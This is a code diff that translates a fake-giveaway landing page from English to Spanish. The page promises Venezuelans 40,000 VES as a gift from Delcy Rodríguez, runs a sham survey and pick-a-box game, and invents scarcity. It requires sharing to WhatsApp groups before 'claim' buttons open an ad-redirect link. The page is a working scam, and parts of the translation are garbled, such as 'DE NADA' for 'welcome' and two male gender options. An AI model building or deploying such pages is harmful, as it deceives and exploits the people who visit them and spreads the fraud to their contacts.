@@ -12,7 +12,7 @@
      <script src="vene-active.js"></script>
 	<script src="demo.js"></script>
 <title>Delcy Rodríguez Obsequio de Celebración de Juramentación de VES40,000 para Venezolanos Mayores de 18 Años</title>
-<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIvFaOzBeWpqc_2RRnpu__fL8fxb1GyqOCqzp_BfcG-oR4v9cPNx02k-kB291Rj-gpUBTE3tpMFkzVDbUNoJYHXMl-LDIBD-iE4pmQ3t-2TpTM_L6J_PAeUxsfcK9m40VCYmRuBcyBArbjDCs0ZcGwl_YE3eclMeKColTQ2kEW-S8d_aNZG6zp-T1gPwqM/s320/5257F869-80EF-499D-A4AD-A9081BDAB4AD.jpeg" />
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3MTQKePsAw_9vZx-WtsDbh3rLamSfr2jXo6jxALB5edj2cZc7jJx_z4fx1iUZ2SXJaOJB-8kv-nDoO3zP0CIsgogChY_V1TQcA2NoD-r1Ox4FQezssqsCgmrFi2k7ZVTE6NZgcg-3RjMT8ariWXfhlyYnJqgRUps07_j5Bznt33WkJvm8Xfh8QV6EbF5s/s320/8C981A58-A757-4D60-BC9C-766B6F5C7D9D.jpeg" />
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -297,23 +297,23 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">¡Felicitaciones! Tus respuestas se han guardado.</h2>
  
 <p class="paragraph">
-Now you have a chance to win VES40,000 New Year Celebration cash Gifts<br><br>
-You have 3 chances ! we wish you good luck
+Ahora tienes la oportunidad de ganar 40.000 VES en regalos de Año Nuevo.<br><br>
+¡Tienes 3 oportunidades! ¡Te deseamos mucha suerte!
 <br><br>
-You need to select the box that has the gift inside the boxes.
+Debes seleccionar la caja que tiene el regalo dentro de las cajas.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+Comenzar
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">Más suerte la próxima vez</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Tienes (2) oportunidades extra. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -322,11 +322,11 @@ OK
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="https://static.vecteezy.com/system/resources/previews/023/209/513/non_2x/big-pile-of-venezuelan-bolivar-notes-a-lot-of-money-over-transparent-background-3d-rendering-of-bundles-of-cash-png.png" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<h1 class="heading heading--h1">Felicidades! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> VES40,000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+Tu premio es: <b> 40.000 VES en efectivo</b><br>Siga las instrucciones de la página siguiente para reclamar su premio.! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -343,12 +343,12 @@ Ok
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirHNCxFWJDihj05rLeVIgSMVwo_mf_KTOaxE-IxESMulYEaQNUO2riFDGb6Qvf00CzagNoLfgcJa9QAy8evCcoS49gzLvKIfDZh_Os3nujUnVkZcos8sjBUPltTaMq4RBh49WVNypGTkZwXGOhtdCfUdn8Gk0EZSx5joj4YNl6UPbQcUvzJ7-KzmOibNyD/s1920/DC404C99-2CFB-4E99-9F03-49F73843E517.jpeg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Hello!
+Hola!
 </h1>
   <p class="paragraph">
-WELCOME  <b>Delcy Rodríguez VES40,000 Swearing in Celebration Gift Venezuelans From Age 18 and above</b>, Dont miss this amazing offer.
+DE NADA  <b>Delcy Rodríguez Obsequia Celebración Juramentación VES40,000 a Venezolanos Mayores de 18 Años</b>, No te pierdas esta increíble oferta.
 <br>
-Answer the questions below to claim <b>VES40,000 Cash Prize</b>
+Responda las preguntas a continuación para reclamar <b>Premio en efectivo de VES40.000</b>
 </p>
   <br>
 </div>
@@ -358,53 +358,53 @@ Answer the questions below to claim <b>VES40,000 Cash Prize</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+                     "Por favor espere un momento...",
+              "Por favor espere un momento...",
+              "Por favor espere un momento..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Has respondido 4/4 de las preguntas
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
+Sus respuestas están siendo procesadas
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+¡Aún hay premios disponibles!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
+Buscando regalos..
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (289) gifts remain!
+¡Solo quedan (289) regalos!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
+Se esta revisando stock
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are You a citizen of venezuela?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "¿Eres de Venezuela?",
+              answers: [ { text: "Sí" }, { text: "No" } ]
             },
                                                                          {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "Elige tu género",
+              answers: [ { text: "Masculina" }, { text: "Masculino" } ]
             },
             {
-              title: "Select Your Age Range?",
+              title: "Seleccione su rango de edad",
               answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
@@ -417,20 +417,20 @@ Stock is being checked
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>Felicidades! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirHNCxFWJDihj05rLeVIgSMVwo_mf_KTOaxE-IxESMulYEaQNUO2riFDGb6Qvf00CzagNoLfgcJa9QAy8evCcoS49gzLvKIfDZh_Os3nujUnVkZcos8sjBUPltTaMq4RBh49WVNypGTkZwXGOhtdCfUdn8Gk0EZSx5joj4YNl6UPbQcUvzJ7-KzmOibNyD/s1920/DC404C99-2CFB-4E99-9F03-49F73843E517.jpeg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Gifts is: <b>VES40,000</b> <br>Follow the instructions below to Get your Gifts !</p>
+<p class="txt1">Tus regalos son: <b>VES40,000</b> <br>Sigue las instrucciones a continuación para obtener tus regalos !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "SHARE" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
+<div id="lastapp"><p class="rules">1. Comparte con 5 grupos / 15 amigos en WhatsApp (haz clic en el icono "COMPARTIR" a continuación).</p><p class="rules">2. Haga clic en "Continuar" y reclame su premio.</p></div>
 
     
-   <div class="share_main_bt" id="whatsapp">SHARE&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+   <div class="share_main_bt" id="whatsapp">COMPARTIR&nbsp;   →</div>
+  <h4 class="textlastup">Comparte hasta que la barra azul esté llena!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -454,19 +454,19 @@ Stock is being checked
                       
     <div id="claim">
       <div class="title1">
-<p>Congratulations! </p>
+<p>Felicidades! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://static.vecteezy.com/system/resources/previews/023/209/513/non_2x/big-pile-of-venezuelan-bolivar-notes-a-lot-of-money-over-transparent-background-3d-rendering-of-bundles-of-cash-png.png" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>VES40,000 cash.</b> <br>Follow the instruction below to claim your Gifts !</p>
+<p class="txt1">Tu premio es: <b>40.000 VES en efectivo.</b> <br>Sigue las instrucciones a continuación para reclamar tus regalos!</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://africa-day-mtn-celebration.blogspot.com/#1734254162204" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM VES40,000</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">RECLAMO VES40,000</font></button>
                     </a><br/> <br/>
 	    
       <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
@@ -479,7 +479,7 @@ Stock is being checked
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw VES40,000</div> 
+            <div class="share_main_bt" id="offers">Retirar VES40.000</div> 
       <br>
           
        
